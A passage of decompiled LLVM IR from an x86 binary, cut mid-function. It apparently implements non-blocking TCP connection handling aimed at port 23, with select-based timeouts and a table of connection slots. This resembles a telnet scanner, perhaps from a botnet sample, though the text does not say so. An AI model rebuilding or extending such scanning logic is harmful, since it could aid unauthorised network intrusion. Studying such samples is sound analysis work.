  %v1_804a07c = add i32 %v0_804a078, -12
  %v2_804a07c = inttoptr i32 %v1_804a07c to i32*
  store i32 0, i32* %v2_804a07c, align 4
  %v0_804a07e = load i32, i32* %edx.global-to-local, align 4
  %v2_804a07e = add i32 %v0_804a078, -16
  %v3_804a07e = inttoptr i32 %v2_804a07e to i32*
  store i32 %v0_804a07e, i32* %v3_804a07e, align 4
  %v3_804a07f = inttoptr i32 %v6_804a02e to i8*
  %v4_804a07f = call i32 @function_804f1d8(i8* %v3_804a07f, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a096 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a096 = inttoptr i32 %v3_804a096 to i8*
  %v5_804a096 = load i8, i8* %v4_804a096, align 1
  %v4_804a09a = icmp eq i8 %v5_804a096, 0
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  br i1 %v4_804a09a, label %dec_label_pc_804a128, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a05b
  store i32 %v1_804a06c, i32* %eax.global-to-local, align 4
  %v2_804a0b6 = load i32, i32* %v1_804a06f, align 4
  store i32 %v2_804a06a, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804a0d2 = inttoptr i32 %v2_804a06a to i32*
  store i32 0, i32* %v2_804a0d2, align 8
  %v0_804a0d4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d4 = add i32 %v0_804a0d4, 4
  store i32 %v1_804a0d4, i32* %eax.global-to-local, align 4
  %v0_804a0d7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0d7 = inttoptr i32 %v1_804a0d4 to i32*
  store i32 %v0_804a0d7, i32* %v2_804a0d7, align 4
  %v0_804a0d9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0d9 = add i32 %v0_804a0d9, 4
  store i32 %v1_804a0d9, i32* %eax.global-to-local, align 4
  %v0_804a0dc = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0dc = inttoptr i32 %v1_804a0d9 to i32*
  store i32 %v0_804a0dc, i32* %v2_804a0dc, align 4
  %v0_804a0de = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0de = add i32 %v0_804a0de, 4
  store i32 %v1_804a0de, i32* %eax.global-to-local, align 4
  %v0_804a0e1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e1 = inttoptr i32 %v1_804a0de to i32*
  store i32 %v0_804a0e1, i32* %v2_804a0e1, align 4
  %v0_804a0e3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e3 = add i32 %v0_804a0e3, 4
  store i32 %v1_804a0e3, i32* %eax.global-to-local, align 4
  %v0_804a0e6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0e6 = inttoptr i32 %v1_804a0e3 to i32*
  store i32 %v0_804a0e6, i32* %v2_804a0e6, align 4
  %v0_804a0e8 = load i32, i32* %eax.global-to-local, align 4
  %v1_804a0e8 = add i32 %v0_804a0e8, 4
  %v0_804a0eb = load i32, i32* %edx.global-to-local, align 4
  %v2_804a0eb = inttoptr i32 %v1_804a0e8 to i32*
  store i32 %v0_804a0eb, i32* %v2_804a0eb, align 4
  store i32 %v1_804a06c, i32* %edx.global-to-local, align 4
  store i32 %v2_804a0b6, i32* @eax, align 4
  store i32 %v2_804a0b6, i32* %v1_804a06f, align 4
  store i32 %v1_804a145, i32* @ebx, align 4
  %v1_804a109 = call i32 @function_8049a2e(i32 %v2_804a0b6)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a113 = load i32, i32* @ebx, align 4
  %v2_804a119 = mul i32 %v0_804a113, 24
  %v2_804a11c = add i32 %v2_804a119, %v2_8049f6b
  %v1_804a11e = or i32 %v2_804a11c, 4
  store i32 %v1_804a11e, i32* %eax.global-to-local, align 4
  %v2_804a121 = inttoptr i32 %v1_804a11e to i32*
  store i32 %v1_804a109, i32* %v2_804a121, align 4
  br label %dec_label_pc_804a1cf

dec_label_pc_804a128:                             ; preds = %dec_label_pc_804a05b
  %v3_804a137 = add i32 %v2_804a137, %v2_804a02b
  %v4_804a137 = inttoptr i32 %v3_804a137 to i8*
  %v5_804a137 = load i8, i8* %v4_804a137, align 1
  %v6_804a137 = zext i8 %v5_804a137 to i32
  %v9_804a137 = or i32 %v6_804a137, %v8_804a02e
  %v1_804a13b = add i32 %v9_804a137, 1
  store i32 %v1_804a13b, i32* %ebx.global-to-local, align 4
  %v1_804a14a = trunc i32 %v1_804a13b to i8
  store i8 %v1_804a14a, i8* %v4_804a137, align 1
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804a15d = load i8, i8* %v4_804a137, align 1
  %v6_804a15d = zext i8 %v5_804a15d to i32
  %v9_804a15d = or i32 %v6_804a15d, %v8_804a02e
  store i32 %v9_804a15d, i32* %eax.global-to-local, align 4
  %v10_804a161 = icmp eq i8 %v5_804a15d, 10
  %v1_804a163 = icmp eq i1 %v10_804a161, false
  br i1 %v1_804a163, label %dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge, label %dec_label_pc_804a165

dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge: ; preds = %dec_label_pc_804a128
  %.pre50 = add i32 %.pre, %v2_804a02b
  %.pre51 = inttoptr i32 %.pre50 to i8*
  br label %dec_label_pc_804a19f

dec_label_pc_804a165:                             ; preds = %dec_label_pc_804a128
  store i8 0, i8* %v4_804a137, align 1
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a188 = add i32 %.pre, %v2_804a02b
  %v4_804a188 = inttoptr i32 %v3_804a188 to i8*
  %v5_804a188 = load i8, i8* %v4_804a188, align 2
  %v6_804a188 = zext i8 %v5_804a188 to i32
  %v9_804a188 = or i32 %v6_804a188, %v8_804a02e
  %v1_804a18c = add i32 %v9_804a188, 1
  store i32 %v1_804a18c, i32* %ebx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v1_804a19b = trunc i32 %v1_804a18c to i8
  store i8 %v1_804a19b, i8* %v4_804a188, align 2
  br label %dec_label_pc_804a19f

dec_label_pc_804a19f:                             ; preds = %dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge, %dec_label_pc_804a165
  %v4_804a1ae.pre-phi = phi i8* [ %.pre51, %dec_label_pc_804a128.dec_label_pc_804a19f_crit_edge ], [ %v4_804a188, %dec_label_pc_804a165 ]
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v5_804a1ae = load i8, i8* %v4_804a1ae.pre-phi, align 1
  %v6_804a1ae = zext i8 %v5_804a1ae to i32
  %v9_804a1ae = or i32 %v6_804a1ae, %v8_804a02e
  store i32 %v9_804a1ae, i32* %eax.global-to-local, align 4
  %v10_804a1b2 = icmp eq i8 %v5_804a1ae, 3
  %v1_804a1b4 = icmp eq i1 %v10_804a1b2, false
  br i1 %v1_804a1b4, label %dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge, label %dec_label_pc_804a1b6

dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge: ; preds = %dec_label_pc_804a19f
  %.pre52 = inttoptr i32 %v2_804a06a to i32*
  br label %dec_label_pc_804a1cf

dec_label_pc_804a1b6:                             ; preds = %dec_label_pc_804a19f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a096, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a1cf:                             ; preds = %dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge, %dec_label_pc_804a0a2
  %v3_804a252.pre-phi = phi i32* [ %.pre52, %dec_label_pc_804a19f.dec_label_pc_804a1cf_crit_edge ], [ %v2_804a0d2, %dec_label_pc_804a0a2 ]
  store i32 2, i32* %stack_var_-204, align 4
  %v0_804a1d8 = load i32, i32* @esp, align 4
  %v1_804a1db = add i32 %v0_804a1d8, -16
  %v2_804a1db = inttoptr i32 %v1_804a1db to i32*
  store i32 23, i32* %v2_804a1db, align 4
  %v0_804a1dd = load i32, i32* %stack_var_-204, align 4
  %v1_804a1dd = call i32 @function_804f4d0(i32 %v0_804a1dd)
  %v0_804a1e2 = load i32, i32* @esp, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804a213 = or i32 %v2_804a06a, 4
  store i32 %v1_804a213, i32* %eax.global-to-local, align 4
  %v1_804a216 = inttoptr i32 %v1_804a213 to i32*
  %v2_804a216 = load i32, i32* %v1_804a216, align 4
  store i32 %v2_804a216, i32* %eax.global-to-local, align 4
  store i32 %v1_804a145, i32* @ebx, align 4
  %v1_804a224 = add i32 %v0_804a1e2, 8
  %v2_804a224 = inttoptr i32 %v1_804a224 to i32*
  store i32 0, i32* %v2_804a224, align 4
  %v1_804a226 = add i32 %v0_804a1e2, 4
  %v2_804a226 = inttoptr i32 %v1_804a226 to i32*
  store i32 1, i32* %v2_804a226, align 4
  %v2_804a228 = inttoptr i32 %v0_804a1e2 to i32*
  store i32 2, i32* %v2_804a228, align 4
  %sext = mul i32 %v1_804a1dd, 65536
  %v4_804a22a = sdiv i32 %sext, 65536
  %v5_804a22a = call i32 @function_804f700(i32 %v4_804a22a, i32 %v2_804a216, i32 0, i32 0)
  %v0_804a237 = load i32, i32* @ebx, align 4
  %v2_804a23d = mul i32 %v0_804a237, 24
  %v3_804a240 = add i32 %v2_804a23d, %v2_8049f6b
  %v4_804a240 = inttoptr i32 %v3_804a240 to i32*
  store i32 %v5_804a22a, i32* %v4_804a240, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a252 = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a252, i32* %eax.global-to-local, align 4
  %v10_804a255 = icmp eq i32 %v4_804a252, -1
  br i1 %v10_804a255, label %dec_label_pc_804b3cf, label %dec_label_pc_804a25e

dec_label_pc_804a25e:                             ; preds = %dec_label_pc_804a1cf
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a26d = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a26d, i32* %eax.global-to-local, align 4
  %v0_804a270 = load i32, i32* @esp, align 4
  %v1_804a273 = add i32 %v0_804a270, -8
  %v2_804a273 = inttoptr i32 %v1_804a273 to i32*
  store i32 0, i32* %v2_804a273, align 4
  %v1_804a275 = add i32 %v0_804a270, -12
  %v2_804a275 = inttoptr i32 %v1_804a275 to i32*
  store i32 3, i32* %v2_804a275, align 4
  %v0_804a277 = load i32, i32* %eax.global-to-local, align 4
  %v2_804a277 = add i32 %v0_804a270, -16
  %v3_804a277 = inttoptr i32 %v2_804a277 to i32*
  store i32 %v0_804a277, i32* %v3_804a277, align 4
  %v3_804a278 = call i32 @function_804dd34(i32 %v2_804a216, i32 0, i32 0)
  %v0_804a27d = load i32, i32* @esp, align 4
  %v12_804a282 = or i32 %v3_804a278, 2048
  store i32 %v12_804a282, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a294 = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a294, i32* %eax.global-to-local, align 4
  %v2_804a29a = add i32 %v0_804a27d, 8
  %v3_804a29a = inttoptr i32 %v2_804a29a to i32*
  store i32 %v12_804a282, i32* %v3_804a29a, align 4
  %v1_804a29b = add i32 %v0_804a27d, 4
  %v2_804a29b = inttoptr i32 %v1_804a29b to i32*
  store i32 4, i32* %v2_804a29b, align 4
  %v0_804a29d = load i32, i32* %eax.global-to-local, align 4
  %v3_804a29d = inttoptr i32 %v0_804a27d to i32*
  store i32 %v0_804a29d, i32* %v3_804a29d, align 4
  %v3_804a29e = call i32 @function_804dd34(i32 %v2_804a216, i32 0, i32 0)
  %v0_804a2a3 = load i32, i32* @esp, align 4
  store i32 %v2_8049f2a, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a2bb = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a2bb, i32* %eax.global-to-local, align 4
  %v1_804a2c1 = add i32 %v0_804a2a3, 8
  %v2_804a2c1 = inttoptr i32 %v1_804a2c1 to i32*
  store i32 16, i32* %v2_804a2c1, align 4
  %v2_804a2c3 = add i32 %v0_804a2a3, 4
  %v3_804a2c3 = inttoptr i32 %v2_804a2c3 to i32*
  store i32 %v2_8049f2a, i32* %v3_804a2c3, align 4
  %v0_804a2c4 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a2c4 = inttoptr i32 %v0_804a2a3 to i32*
  store i32 %v0_804a2c4, i32* %v3_804a2c4, align 4
  %v3_804a2c5 = call i32 @function_804f584(i32 %v2_804a216, i32 0, i32 0)
  store i32 %v3_804a2c5, i32* %eax.global-to-local, align 4
  %v10_804a2cd = icmp eq i32 %v3_804a2c5, -1
  %v1_804a2d0 = icmp eq i1 %v10_804a2cd, false
  br i1 %v1_804a2d0, label %dec_label_pc_804a315, label %dec_label_pc_804a2d2

dec_label_pc_804a2d2:                             ; preds = %dec_label_pc_804a25e
  %v1_804a2d2 = call i32 @function_804e1ec(i32 %v2_804a216)
  store i32 %v1_804a2d2, i32* %eax.global-to-local, align 4
  %v1_804a2d7 = inttoptr i32 %v1_804a2d2 to i32*
  %v2_804a2d7 = load i32, i32* %v1_804a2d7, align 4
  store i32 %v2_804a2d7, i32* %eax.global-to-local, align 4
  %v9_804a2d9 = icmp eq i32 %v2_804a2d7, 115
  br i1 %v9_804a2d9, label %dec_label_pc_804a315, label %dec_label_pc_804a2de

dec_label_pc_804a2de:                             ; preds = %dec_label_pc_804a2d2
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a2ed = load i32, i32* %v3_804a252.pre-phi, align 4
  store i32 %v4_804a2ed, i32* %eax.global-to-local, align 4
  %v0_804a2f0 = load i32, i32* @esp, align 4
  %v2_804a2f3 = add i32 %v0_804a2f0, -16
  %v3_804a2f3 = inttoptr i32 %v2_804a2f3 to i32*
  store i32 %v4_804a2ed, i32* %v3_804a2f3, align 4
  %v1_804a2f4 = call i32 @function_8049e8b(i32 %v2_804a216)
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804a096, align 1
  br label %dec_label_pc_804b3cf

dec_label_pc_804a315:                             ; preds = %dec_label_pc_804a2d2, %dec_label_pc_804a25e
  store i8 1, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804a33a = add i32 %v2_804a06a, 12
  store i32 %v1_804a33a, i32* %eax.global-to-local, align 4
  %v1_804a33d = inttoptr i32 %v1_804a33a to i32*
  store i32 0, i32* %v1_804a33d, align 4
  br label %dec_label_pc_804b3cf

dec_label_pc_804a348:                             ; preds = %dec_label_pc_804a01f
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v2_804a357 = add i32 %v2_804a02b, %v2_8049f6b
  %v1_804a359 = add i32 %v2_804a357, 12
  store i32 %v1_804a359, i32* %eax.global-to-local, align 4
  %v1_804a35c = inttoptr i32 %v1_804a359 to i32*
  %v2_804a35c = load i32, i32* %v1_804a35c, align 4
  store i32 %v2_804a35c, i32* %eax.global-to-local, align 4
  %v1_804a35e = icmp eq i32 %v2_804a35c, 0
  %v1_804a360 = icmp eq i1 %v1_804a35e, false
  br i1 %v1_804a360, label %dec_label_pc_804a387, label %dec_label_pc_804a362

dec_label_pc_804a362:                             ; preds = %dec_label_pc_804a348
  store i32 %v1_804a145, i32* @ebx, align 4
  %v0_804a365 = load i32, i32* @esp, align 4
  %v1_804a368 = add i32 %v0_804a365, -16
  %v2_804a368 = inttoptr i32 %v1_804a368 to i32*
  store i32 0, i32* %v2_804a368, align 4
  %v1_804a36a = inttoptr i32 %v6_804a02e to i32*
  %v2_804a36a = call i32 @function_804e134(i32* %v1_804a36a)
  store i32 %v2_8049f6b, i32* %edx.global-to-local, align 4
  %v0_804a377 = load i32, i32* @ebx, align 4
  %v2_804a37d = mul i32 %v0_804a377, 24
  %v1_804a382 = add i32 %v2_804a380, %v2_804a37d
  store i32 %v1_804a382, i32* %eax.global-to-local, align 4
  %v2_804a385 = inttoptr i32 %v1_804a382 to i32*
  store i32 %v2_804a36a, i32* %v2_804a385, align 4
  br label %dec_label_pc_804a387

dec_label_pc_804a387:                             ; preds = %dec_label_pc_804a348, %dec_label_pc_804a362
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 %v2_804a391, i32* @edi, align 4
  %v5_804a398 = call i8* @_memset(i8* %tmp88, i32 0, i32 32)
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a3af = inttoptr i32 %v2_804a357 to i32*
  %v4_804a3af = load i32, i32* %v3_804a3af, align 8
  %v2_804a3b4 = udiv i32 %v4_804a3af, 32
  store i32 %v2_804a3b4, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a3c6 = load i32, i32* %v3_804a3af, align 8
  %v1_804a3c9 = urem i32 %v4_804a3c6, 32
  store i32 %v1_804a3c9, i32* %eax.global-to-local, align 4
  %v0_804a3cc = load i32, i32* @ebp, align 4
  %v2_804a3cc = mul nuw nsw i32 %v2_804a3b4, 4
  %v3_804a3cc = add nsw i32 %v2_804a3cc, -168
  %v4_804a3cc = add i32 %v3_804a3cc, %v0_804a3cc
  %v5_804a3cc = inttoptr i32 %v4_804a3cc to i32*
  %v6_804a3cc = load i32, i32* %v5_804a3cc, align 4
  %v9_804a3cc = shl i32 1, %v1_804a3c9
  %v12_804a3cc = or i32 %v6_804a3cc, %v9_804a3cc
  store i32 %v12_804a3cc, i32* %v5_804a3cc, align 4
  store i32 0, i32* %stack_var_-180, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a3f7 = load i32, i32* %v3_804a3af, align 8
  %v1_804a3fa = add i32 %v4_804a3f7, 1
  store i32 %v1_804a3fa, i32* %edx.global-to-local, align 4
  %v0_804a3fd = load i32, i32* @esp, align 4
  %v2_804a406 = add i32 %v0_804a3fd, -16
  %v3_804a406 = inttoptr i32 %v2_804a406 to i32*
  store i32 %v2_804a400, i32* %v3_804a406, align 4
  %v1_804a407 = add i32 %v0_804a3fd, -20
  %v2_804a407 = inttoptr i32 %v1_804a407 to i32*
  store i32 0, i32* %v2_804a407, align 4
  store i32 %v2_804a391, i32* %eax.global-to-local, align 4
  %v2_804a40f = add i32 %v0_804a3fd, -24
  %v3_804a40f = inttoptr i32 %v2_804a40f to i32*
  store i32 %v2_804a391, i32* %v3_804a40f, align 4
  %v1_804a410 = add i32 %v0_804a3fd, -28
  %v2_804a410 = inttoptr i32 %v1_804a410 to i32*
  store i32 0, i32* %v2_804a410, align 4
  %v0_804a412 = load i32, i32* %edx.global-to-local, align 4
  %v2_804a412 = add i32 %v0_804a3fd, -32
  %v3_804a412 = inttoptr i32 %v2_804a412 to i32*
  store i32 %v0_804a412, i32* %v3_804a412, align 4
  %v0_804a413 = load i32, i32* %stack_var_-180, align 4
  %v2_804a413 = load i32, i32* %stack_var_-172, align 4
  %v5_804a413 = call i32 @function_804e074(i32 %v0_804a413, i32 10000, i32 %v2_804a413, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804a413, i32* %eax.global-to-local, align 4
  %v0_804a418 = load i32, i32* @esp, align 4
  %v12_804a41e = icmp eq i32 %v5_804a413, 1
  %v1_804a422 = icmp eq i1 %v12_804a41e, false
  br i1 %v1_804a422, label %dec_label_pc_804a581, label %dec_label_pc_804a428

dec_label_pc_804a428:                             ; preds = %dec_label_pc_804a387
  store i32 4, i32* %stack_var_-184, align 4
  store i32 0, i32* %stack_var_-188, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a44b = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a44b, i32* %edx.global-to-local, align 4
  %v2_804a457 = add i32 %v0_804a418, 16
  %v3_804a457 = inttoptr i32 %v2_804a457 to i32*
  store i32 %v2_804a451, i32* %v3_804a457, align 4
  store i32 %v2_804a458, i32* %eax.global-to-local, align 4
  %v2_804a45e = add i32 %v0_804a418, 12
  %v3_804a45e = inttoptr i32 %v2_804a45e to i32*
  store i32 %v2_804a458, i32* %v3_804a45e, align 4
  %v1_804a45f = add i32 %v0_804a418, 8
  %v2_804a45f = inttoptr i32 %v1_804a45f to i32*
  store i32 4, i32* %v2_804a45f, align 4
  %v1_804a461 = add i32 %v0_804a418, 4
  %v2_804a461 = inttoptr i32 %v1_804a461 to i32*
  store i32 1, i32* %v2_804a461, align 4
  %v0_804a463 = load i32, i32* %edx.global-to-local, align 4
  %v3_804a463 = inttoptr i32 %v0_804a418 to i32*
  store i32 %v0_804a463, i32* %v3_804a463, align 4
  %v0_804a464 = load i32, i32* %stack_var_-188, align 4
  %v1_804a464 = load i32, i32* %stack_var_-184, align 4
  %v2_804a464 = load i32, i32* %stack_var_-180, align 4
  %v4_804a464 = load i32, i32* %stack_var_-172, align 4
  %v5_804a464 = call i32 @function_804f5dc(i32 %v0_804a464, i32 %v1_804a464, i32 %v2_804a464, i32 10000, i32 %v4_804a464)
  %v0_804a469 = load i32, i32* @esp, align 4
  %v3_804a46c = load i32, i32* %stack_var_-188, align 4
  %v1_804a472 = icmp eq i32 %v3_804a46c, 0
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a4d0 = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a4d0, i32* %eax.global-to-local, align 4
  br i1 %v1_804a472, label %dec_label_pc_804a4c1, label %dec_label_pc_804a476

dec_label_pc_804a476:                             ; preds = %dec_label_pc_804a428
  %v2_804a48b = add i32 %v0_804a469, 16
  %v3_804a48b = inttoptr i32 %v2_804a48b to i32*
  store i32 %v4_804a4d0, i32* %v3_804a48b, align 4
  %v0_804a48c = load i32, i32* %stack_var_-188, align 4
  %v1_804a48c = call i32 @function_8049e8b(i32 %v0_804a48c)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a4b7 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a4b7 = inttoptr i32 %v3_804a4b7 to i8*
  store i8 1, i8* %v4_804a4b7, align 1
  br label %dec_label_pc_804a5cd

dec_label_pc_804a4c1:                             ; preds = %dec_label_pc_804a428
  %v1_804a4d6 = add i32 %v0_804a469, 24
  %v2_804a4d6 = inttoptr i32 %v1_804a4d6 to i32*
  store i32 0, i32* %v2_804a4d6, align 4
  %v1_804a4d8 = add i32 %v0_804a469, 20
  %v2_804a4d8 = inttoptr i32 %v1_804a4d8 to i32*
  store i32 3, i32* %v2_804a4d8, align 4
  %v0_804a4da = load i32, i32* %eax.global-to-local, align 4
  %v2_804a4da = add i32 %v0_804a469, 16
  %v3_804a4da = inttoptr i32 %v2_804a4da to i32*
  store i32 %v0_804a4da, i32* %v3_804a4da, align 4
  %v0_804a4db = load i32, i32* %stack_var_-188, align 4
  %v1_804a4db = load i32, i32* %stack_var_-184, align 4
  %v2_804a4db = load i32, i32* %stack_var_-180, align 4
  %v3_804a4db = call i32 @function_804dd34(i32 %v0_804a4db, i32 %v1_804a4db, i32 %v2_804a4db)
  %v0_804a4e0 = load i32, i32* @esp, align 4
  %v13_804a4e5 = and i32 %v3_804a4db, -2049
  store i32 %v13_804a4e5, i32* @ebx, align 4
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a4f7 = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a4f7, i32* %eax.global-to-local, align 4
  %v2_804a4fd = add i32 %v0_804a4e0, 8
  %v3_804a4fd = inttoptr i32 %v2_804a4fd to i32*
  store i32 %v13_804a4e5, i32* %v3_804a4fd, align 4
  %v1_804a4fe = add i32 %v0_804a4e0, 4
  %v2_804a4fe = inttoptr i32 %v1_804a4fe to i32*
  store i32 4, i32* %v2_804a4fe, align 4
  %v0_804a500 = load i32, i32* %eax.global-to-local, align 4
  %v3_804a500 = inttoptr i32 %v0_804a4e0 to i32*
  store i32 %v0_804a500, i32* %v3_804a500, align 4
  %v0_804a501 = load i32, i32* %stack_var_-188, align 4
  %v1_804a501 = load i32, i32* %stack_var_-184, align 4
  %v2_804a501 = load i32, i32* %stack_var_-180, align 4
  %v3_804a501 = call i32 @function_804dd34(i32 %v0_804a501, i32 %v1_804a501, i32 %v2_804a501)
  store i32 0, i32* %v1_804a35c, align 4
  %v1_804a534 = add i32 %v2_804a357, 16
  %v1_804a537 = inttoptr i32 %v1_804a534 to i16*
  store i16 0, i16* %v1_804a537, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  %v1_804a54d = add i32 %v2_804a357, 20
  store i32 %v1_804a54d, i32* %eax.global-to-local, align 4
  %v1_804a550 = inttoptr i32 %v1_804a54d to i32*
  %v2_804a550 = load i32, i32* %v1_804a550, align 4
  store i32 %v2_804a550, i32* %edx.global-to-local, align 4
  store i32 1024, i32* %eax.global-to-local, align 4
  %v0_804a559 = load i32, i32* @esp, align 4
  %v2_804a55c = add i32 %v0_804a559, -8
  %v3_804a55c = inttoptr i32 %v2_804a55c to i32*
  store i32 1024, i32* %v3_804a55c, align 4
  %v1_804a55d = add i32 %v0_804a559, -12
  %v2_804a55d = inttoptr i32 %v1_804a55d to i32*
  store i32 0, i32* %v2_804a55d, align 4
  %v0_804a55f = load i32, i32* %edx.global-to-local, align 4
  %v2_804a55f = add i32 %v0_804a559, -16
  %v3_804a55f = inttoptr i32 %v2_804a55f to i32*
  store i32 %v0_804a55f, i32* %v3_804a55f, align 4
  %v0_804a560 = load i32, i32* %stack_var_-188, align 4
  %v1_804a560 = load i32, i32* %stack_var_-184, align 4
  %v2_804a560 = load i32, i32* %stack_var_-180, align 4
  %v3_804a560 = inttoptr i32 %v0_804a560 to i8*
  %v4_804a560 = call i32 @function_804f1d8(i8* %v3_804a560, i32 %v1_804a560, i32 %v2_804a560)
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  store i8 2, i8* %v4_804a02e, align 8
  br label %dec_label_pc_804b3cf

dec_label_pc_804a581:                             ; preds = %dec_label_pc_804a387
  %v13_804a581 = icmp eq i32 %v5_804a413, -1
  %v1_804a585 = icmp eq i1 %v13_804a581, false
  br i1 %v1_804a585, label %dec_label_pc_804a5cd, label %dec_label_pc_804a587

dec_label_pc_804a587:                             ; preds = %dec_label_pc_804a581
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v4_804a596 = load i32, i32* %v3_804a3af, align 8
  store i32 %v4_804a596, i32* %eax.global-to-local, align 4
  %v2_804a59c = add i32 %v0_804a418, 16
  %v3_804a59c = inttoptr i32 %v2_804a59c to i32*
  store i32 %v4_804a596, i32* %v3_804a59c, align 4
  %v1_804a59d = call i32 @function_8049e8b(i32 %v5_804a413)
  store i8 0, i8* %v4_804a02e, align 8
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v2_804a02b, i32* %eax.global-to-local, align 4
  %v3_804a5c8 = add i32 %v2_8049faf, %v2_804a02b
  %v4_804a5c8 = inttoptr i32 %v3_804a5c8 to i8*
  store i8 1, i8* %v4_804a5c8, align 1
  br label %dec_label_pc_804a5cd

dec_label_pc_804a5cd:                             ; preds = %dec_label_pc_804a581, %dec_label_pc_804a476, %dec_label_pc_804a587
  store i32 %v1_804a145, i32* %edx.global-to-local, align 4
  store i32 %v1_804a359, i32* %eax.global-to-local, align 4
  %v2_804a5e1 = load i32, i32* %v1_804a35c, align 4
  store i32 %v2_804a5e1, i32* %eax.global-to-local, align 4
  %v1_804a5e3 = add i32 %v2_804a5e1, 10
  store i32 %v1_804a5e3, i32* @ebx, align 4
  %v0_804a5e6 = load i32, i32* @esp, align 4
  %v1_804a5e9 = add i32 %v0_804a5e6, -16
  %v2_804a5e9 = inttoptr i32 %v1_804a5e9 to i32*
  store i32 0, i32* %v2_804a5e9, align 4
  %v0_804a5eb = load i32, i32* %stack_var_-188, align 4
  %v1_804a5eb = inttoptr i32 %v0_804a5eb to i32*
  %v2_804a5eb = call i32 @function_804e134(i32* %v1_804a5eb)
  store i32 %v2_804a5eb, i32* %eax.global-to-local, align 4
  %v0_804a5f3 = load i32, i32* @ebx, align 4
  %v7_804a5f3 = icmp ult i32 %v0_804a5f3, %v2_804a5eb
  %v1_804a5f5 = icmp eq i1 %v7_804a5f3, false
